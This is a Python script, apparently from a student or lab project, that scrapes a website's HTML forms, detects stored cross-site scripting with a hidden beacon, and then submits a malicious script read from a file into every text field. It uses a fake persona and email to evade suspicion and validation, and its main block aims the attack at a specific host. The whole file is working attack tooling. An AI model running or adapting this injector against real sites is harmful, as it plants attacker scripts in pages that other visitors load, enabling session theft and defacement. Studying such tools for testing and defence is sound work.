import requests
from bs4 import BeautifulSoup
from json import dumps
from urllib.parse import urljoin


def get_forms(target_url):
    """
    Function requests all website HTML forms
    :param target_url: Requested URL
    :return: Returns all forms from HTML content
    """
    # Extract HTML source code of target website
    soup = BeautifulSoup(requests.get(target_url).content, "html.parser")
    # Find all "form" elements and return result
    return soup.find_all("form")


def get_form_attributes(form):
    """
    Function extracts all attributes of HTML form
    :param form: HTML form
    :return: All attributes and values of HTML form
    """
    # Define form attributes array
    form_attributes = {}
    # Get the form action attribute
    action = form.attrs.get("action")
    # Get the form method attribute
    method = form.attrs.get("method")
    # Define form input attributes and values list
    form_inputs = []
    # Iterate over all form elements (input, button, textarea) and add each attribute to list
    for form_input in form.find_all(["input", "button", "textarea"]):
        form_input_type = form_input.attrs.get("type", "text")
        form_input_name = form_input.attrs.get("name")
        form_inputs.append({"type": form_input_type, "name": form_input_name})
    # Add all attributes and values to array
    form_attributes["action"] = action
    form_attributes["method"] = method
    form_attributes["inputs"] = form_inputs
    return form_attributes


def submit_form(form_attributes, target_url, value):
    """
    Function prepares form data and submits form
    :param form_attributes: Form input attributes with values
    :param target_url: Requested URL
    :param value: Malicious script
    :return: HTTP Response after form submission
    """
    # Construct form submission URL
    submit_url = urljoin(target_url, form_attributes["action"])
    # Get the form inputs
    form_inputs = form_attributes["inputs"]
    # Username input name variants
    form_input_names = ["name", "username", "nickname", "firstname", "surname"]
    # Define form data array
    form_data = {}
    # Iterate over all form elements and add them values
    for form_input in form_inputs:
        if form_input["type"] == "text" or form_input["type"] == "submit":
            # If input name attribute value is contained one of the name variants
            if form_input["name"] in form_input_names:
                # Prepare username to decrease suspicion
                form_input["value"] = "Mallory"
            else:
                # Prepare at least few chars with value
                form_input["value"] = "Hi, I am here for the first time :-)" + value
        elif form_input["type"] == "email":
            # Prepare email address to pass potential input validation
            form_input["value"] = "evil.eva@email.com"
        form_input_name = form_input.get("name")
        form_input_value = form_input.get("value")
        if form_input_name and form_input_value:
            # Add values to the data of form submission
            form_data[form_input_name] = form_input_value
    # Sends a POST request if method is post and return response
    if form_attributes["method"] == "post":
        return requests.post(submit_url, data=form_data)
    # Sends a GET request if method is get and return response
    else:
        return requests.get(submit_url, params=form_data)


def scan_xss(target_url):
    """
    Function submits form and returns Cross-Site Scripting vulnerability
    :param target_url: Target URL
    :return: Vulnerability
    """
    forms = get_forms(target_url)
    # Define beacon for next vulnerability detection
    beacon = '<span style="display: none" id="b1865478"></span>'
    # Print number of detected forms on a website
    print(f"Detected {len(forms)} forms on {target_url}.")
    # Iterate over all forms
    for form in forms:
        form_attributes = get_form_attributes(form)
        content = submit_form(form_attributes, target_url, beacon).content.decode()
        # If beacon is found, website is vulnerable to XSS
        if beacon in content:
            print(f"XSS was detected on {target_url}")
            print(f"Vulnerable form attributes:")
            print(dumps(form_attributes, indent=4))
        else:
            print(f"XSS was not detected on {target_url}")


def run_xss(target_url):
    """
    Function performs Cross-Site Scripting attack
    :param target_url: Target URL
    :return: Attack success
    """
    try:
        with open("xss.txt", "r", encoding="utf-8") as script_file:
            beacon = '<span style="display: none" id="b1865488"></span>'
            xss_script = script_file.read()
            is_success = False
            forms = get_forms(target_url)
            # Iterate over all forms
            for form in forms:
                # Get form attributes
                form_attributes = get_form_attributes(form)
                # Submit form and save HTTP response
                content = submit_form(form_attributes, target_url, xss_script).content.decode()
                # Check if XSS script is injected in the website's source code
                if beacon in content:
                    is_success = True
            if is_success:
                print(f"XSS was successful")
            else:
                print(f"XSS was unsuccessful")
    except FileNotFoundError:
        print("File with script was not found")


if __name__ == "__main__":
    url = "http://apache1.willilazarov.cz/"
    run_xss(url)